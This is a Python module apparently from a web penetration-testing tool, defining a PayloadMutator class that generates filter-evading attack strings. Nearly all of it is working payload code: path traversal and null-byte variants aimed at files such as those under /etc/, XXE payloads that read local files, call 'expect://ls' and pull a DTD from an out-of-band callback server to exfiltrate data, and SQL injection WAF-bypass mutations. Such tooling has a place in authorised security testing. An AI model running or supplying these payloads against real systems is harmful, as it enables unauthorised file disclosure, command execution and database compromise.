"""
Payload Mutator

This module provides payload mutation capabilities to generate variations
of base payloads including:
- Case variations (upper, lower, mixed)
- Encoding variations (URL, double URL, Unicode, hex)
- Extension mutations (.bak, .old, .tmp, etc.)
- Path variations (with/without leading slash, backslashes, etc.)
- Null byte injection variants
- Comment-based bypass variations
"""

import urllib.parse
import logging
from typing import List, Set, Dict, Any

logger = logging.getLogger(__name__)


class PayloadMutator:
    """
    Generate variations of payloads to bypass filters and increase success rates.
    """
    
    # Common backup file extensions
    BACKUP_EXTENSIONS = [
        '.bak',
        '.backup',
        '.old',
        '.tmp',
        '.save',
        '.swp',
        '.orig',
        '~',
        '.1',
        '.2',
        '_backup',
        '_old',
        '.copy',
    ]
    
    # Common configuration file extensions
    CONFIG_EXTENSIONS = [
        '',
        '.php',
        '.inc',
        '.conf',
        '.config',
        '.ini',
        '.xml',
        '.json',
        '.yaml',
        '.yml',
    ]
    
    @staticmethod
    def generate_case_variations(payload: str) -> List[str]:
        """
        Generate case variations of a payload.
        
        Args:
            payload: Base payload string
            
        Returns:
            List of case-varied payloads
        """
        variations = [
            payload,
            payload.lower(),
            payload.upper(),
        ]
        
        # Title case for paths
        if '/' in payload or '\\' in payload:
            variations.append(payload.title())
        
        return list(set(variations))
    
    @staticmethod
    def generate_encoding_variations(payload: str) -> List[str]:
        """
        Generate encoded variations of a payload.
        
        Args:
            payload: Base payload string
            
        Returns:
            List of encoded payloads
        """
        variations = [payload]
        
        try:
            # URL encoding
            variations.append(urllib.parse.quote(payload))
            
            # Double URL encoding
            variations.append(urllib.parse.quote(urllib.parse.quote(payload)))
            
            # Plus encoding (spaces to +)
            variations.append(urllib.parse.quote_plus(payload))
            
            # Partial encoding (encode only special chars)
            partial = payload.replace('/', '%2f').replace('\\', '%5c')
            variations.append(partial)
            
            # Mixed case encoding
            mixed_encoded = payload.replace('/', '%2F').replace('\\', '%5C')
            variations.append(mixed_encoded)
            
        except Exception as e:
            logger.debug(f"Error generating encoding variations: {e}")
        
        return list(set(variations))
    
    @staticmethod
    def generate_path_variations(file_path: str) -> List[str]:
        """
        Generate path variations for file inclusion/disclosure attacks.
        
        Args:
            file_path: Base file path
            
        Returns:
            List of path variations
        """
        variations = [file_path]
        
        # Remove leading slashes
        if file_path.startswith('/'):
            variations.append(file_path[1:])
        elif file_path.startswith('\\'):
            variations.append(file_path[1:])
        else:
            # Add leading slashes if not present
            variations.append('/' + file_path)
            variations.append('\\' + file_path)
        
        # Convert between forward and back slashes
        variations.append(file_path.replace('/', '\\'))
        variations.append(file_path.replace('\\', '/'))
        
        # Dot-slash variations
        variations.append('./' + file_path.lstrip('/').lstrip('\\'))
        variations.append('.\\' + file_path.lstrip('/').lstrip('\\'))
        
        # Null byte injection (may work on older systems)
        variations.append(file_path + '%00')
        variations.append(file_path + '\x00')
        
        return list(set(variations))
    
    @staticmethod
    def generate_extension_variations(file_path: str, extensions: List[str] = None) -> List[str]:
        """
        Generate file extension variations.
        
        Args:
            file_path: Base file path
            extensions: List of extensions to try (default: backup extensions)
            
        Returns:
            List of file paths with different extensions
        """
        if extensions is None:
            extensions = PayloadMutator.BACKUP_EXTENSIONS
        
        variations = [file_path]
        
        # Add extensions
        for ext in extensions:
            variations.append(file_path + ext)
        
        # Replace existing extension
        if '.' in file_path:
            base = file_path.rsplit('.', 1)[0]
            for ext in extensions:
                if ext.startswith('.'):
                    variations.append(base + ext)
        
        return list(set(variations))
    
    @staticmethod
    def generate_sensitive_file_variations(base_path: str) -> List[str]:
        """
        Generate variations of sensitive file paths commonly found in info disclosure.
        
        Args:
            base_path: Base file path (e.g., 'config.php')
            
        Returns:
            List of variations
        """
        variations = []
        
        # Original path
        variations.append(base_path)
        
        # Add leading paths if not present
        if not base_path.startswith('/') and not base_path.startswith('\\'):
            variations.append('/' + base_path)
            variations.append('./' + base_path)
        
        # Common locations
        common_dirs = [
            '',
            '/',
            '/var/www/html/',
            '/var/www/',
            '/usr/share/',
            '/etc/',
            '/home/',
            '/opt/',
            'C:\\',
            'C:\\inetpub\\wwwroot\\',
            'C:\\xampp\\htdocs\\',
        ]
        
        for dir_path in common_dirs:
            full_path = dir_path + base_path.lstrip('/').lstrip('\\')
            variations.append(full_path)
        
        # Add backup extensions
        for var in list(variations):
            for ext in PayloadMutator.BACKUP_EXTENSIONS[:5]:  # Top 5 most common
                variations.append(var + ext)
        
        # Case variations for path components
        if '/' in base_path or '\\' in base_path:
            variations.extend(PayloadMutator.generate_case_variations(base_path))
        
        return list(set(variations))
    
    @staticmethod
    def generate_traversal_variations(file_path: str, max_depth: int = 8) -> List[str]:
        """
        Generate path traversal variations.
        
        Args:
            file_path: Target file path
            max_depth: Maximum traversal depth
            
        Returns:
            List of traversal payloads
        """
        # Remove leading slashes for traversal
        clean_path = file_path.lstrip('/').lstrip('\\')
        
        variations = []
        
        # Basic traversal depths
        for depth in range(1, max_depth + 1):
            variations.append('../' * depth + clean_path)
            variations.append('..\\' * depth + clean_path)
        
        # Encoded traversal
        for depth in range(2, 6):  # Focus on common depths
            variations.append('%2e%2e/' * depth + clean_path)
            variations.append('..%2f' * depth + clean_path)
            variations.append('%2e%2e%2f' * depth + clean_path)
        
        # Double encoding
        for depth in range(2, 4):
            variations.append('%252e%252e/' * depth + clean_path)
            variations.append('..%252f' * depth + clean_path)
        
        # Bypass attempts
        variations.append('....//....//....//..../' + clean_path)
        variations.append('....\\\\....\\\\....\\\\....\\' + clean_path)
        
        return list(set(variations))
    
    @staticmethod
    def mutate_payload_list(base_payloads: List[str], 
                           mutation_types: List[str] = None) -> List[str]:
        """
        Apply multiple mutation types to a list of payloads.
        
        Args:
            base_payloads: List of base payloads
            mutation_types: Types of mutations to apply
                          Options: 'case', 'encoding', 'path', 'extension', 'traversal'
                          Default: ['case', 'encoding']
            
        Returns:
            List of mutated payloads (deduplicated)
        """
        if mutation_types is None:
            mutation_types = ['case', 'encoding']
        
        all_mutations: Set[str] = set(base_payloads)
        
        for payload in base_payloads:
            if 'case' in mutation_types:
                all_mutations.update(PayloadMutator.generate_case_variations(payload))
            
            if 'encoding' in mutation_types:
                all_mutations.update(PayloadMutator.generate_encoding_variations(payload))
            
            if 'path' in mutation_types:
                all_mutations.update(PayloadMutator.generate_path_variations(payload))
            
            if 'extension' in mutation_types:
                all_mutations.update(PayloadMutator.generate_extension_variations(payload))
            
            if 'traversal' in mutation_types and ('/' in payload or '\\' in payload):
                all_mutations.update(PayloadMutator.generate_traversal_variations(payload))
        
        return list(all_mutations)
    
    @staticmethod
    def generate_xxe_entity_variations(file_path: str, callback_server: str = None) -> List[str]:
        """
        Generate XXE payload variations for different entity types.
        
        Args:
            file_path: File to extract via XXE
            callback_server: Optional callback server for OOB attacks
            
        Returns:
            List of XXE payloads
        """
        payloads = []
        
        # Basic file read
        payloads.append(f'''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file_path}">]>
<root>&xxe;</root>''')
        
        # PHP wrapper (base64)
        payloads.append(f'''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file_path}">]>
<root>&xxe;</root>''')
        
        # Expect wrapper
        payloads.append(f'''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://ls">]>
<root>&xxe;</root>''')
        
        # Parameter entity
        if callback_server:
            payloads.append(f'''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file://{file_path}">
<!ENTITY % dtd SYSTEM "http://{callback_server}/evil.dtd">
%dtd;
]>
<root>&send;</root>''')
        
        # UTF-7 encoding bypass
        payloads.append(f'''<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE foo+AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file://{file_path}+ACI-+AD4-+AF0-
+ADw-root+AD4-+ACY-xxe;+ADw-/root+AD4-''')
        
        return payloads
    
    @staticmethod
    def generate_sqli_bypass_variations(base_payload: str) -> List[str]:
        """
        Generate SQL injection bypass variations.
        
        Args:
            base_payload: Base SQLi payload
            
        Returns:
            List of bypass variations
        """
        variations = [base_payload]
        
        # Comment variations
        variations.append(base_payload.replace('--', '#'))
        variations.append(base_payload.replace('--', '/*'))
        variations.append(base_payload + '-- -')
        
        # Space bypass
        space_replacements = ['/**/','%09','%0a','%0b','%0c','%0d','%20','+']
        for replacement in space_replacements[:3]:  # Top 3
            variations.append(base_payload.replace(' ', replacement))
        
        # Case variations for keywords
        if 'union' in base_payload.lower():
            variations.append(base_payload.replace('UNION', 'UnIoN'))
            variations.append(base_payload.replace('UNION', 'uNiOn'))
        
        if 'select' in base_payload.lower():
            variations.append(base_payload.replace('SELECT', 'SeLeCt'))
            variations.append(base_payload.replace('SELECT', 'sElEcT'))
        
        return list(set(variations))
